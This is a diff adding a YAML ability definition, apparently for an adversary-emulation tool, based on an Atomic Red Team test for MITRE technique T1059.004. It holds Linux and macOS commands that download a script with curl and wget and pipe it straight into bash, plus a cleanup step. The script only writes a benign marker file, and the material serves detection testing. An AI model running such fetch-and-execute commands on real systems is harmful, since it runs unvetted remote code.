@@ -1,0 +1,30 @@
+---
+- id: 9eaa8755acee93ec312e4e496df0d9a1
+  name: Command-Line Interface
+  description: 'Using Curl to download and pipe a payload to Bash. NOTE: Curl-ing
+    to Bash is generally a bad idea if you don''t control the server.
+
+
+    Upon successful execution, sh will download via curl and wget the specified payload
+    (echo-art-fish.sh) and set a marker file in `/tmp/art-fish.txt`.
+
+    '
+  tactic: execution
+  technique:
+    attack_id: T1059.004
+    name: 'Command and Scripting Interpreter: Bash'
+  platforms:
+    linux:
+      sh:
+        command: curl -sS https://raw.githubusercontent.com/redcanaryco/atomic-red-team/master/atomics/T1059.004/src/echo-art-fish.sh
+          | bash; wget --quiet -O - https://raw.githubusercontent.com/redcanaryco/atomic-red-team/master/atomics/T1059.004/src/echo-art-fish.sh
+          | bash
+        payloads: []
+        cleanup: rm /tmp/art-fish.txt
+    darwin:
+      sh:
+        command: curl -sS https://raw.githubusercontent.com/redcanaryco/atomic-red-team/master/atomics/T1059.004/src/echo-art-fish.sh
+          | bash; wget --quiet -O - https://raw.githubusercontent.com/redcanaryco/atomic-red-team/master/atomics/T1059.004/src/echo-art-fish.sh
+          | bash
+        payloads: []
+        cleanup: rm /tmp/art-fish.txt
